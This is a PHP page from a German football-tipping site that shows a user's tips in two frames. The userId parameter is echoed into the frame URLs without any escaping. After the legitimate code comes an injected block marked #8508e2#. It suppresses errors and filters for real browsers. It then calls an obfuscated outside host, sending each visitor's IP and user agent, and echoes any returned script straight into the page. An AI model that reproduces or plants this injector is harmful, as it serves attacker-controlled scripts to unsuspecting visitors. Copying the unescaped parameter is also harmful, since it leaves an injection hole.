<?php
// we must never forget to start the session
session_start();
$userId=$_GET["userId"];
echo "<html>";
echo "<head>";
echo "<title>EM-Tipp - User Tipps</title>";
echo "</head>";

if(strlen($userId)>0)
{
	echo "<frameset cols=\"50%,50%\">";
	echo "	<frame src='./showGroupTipps.php5?userId=$userId' name='Gruppen'>";
	echo "	<frame src='./showRestTipps.php5?userId=$userId' name='Rest'>";
	echo "</frameset>";
}
else
{
	echo "<br> kein User gesetzt";
}
?>
<?php
#8508e2#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/8508e2#
?>
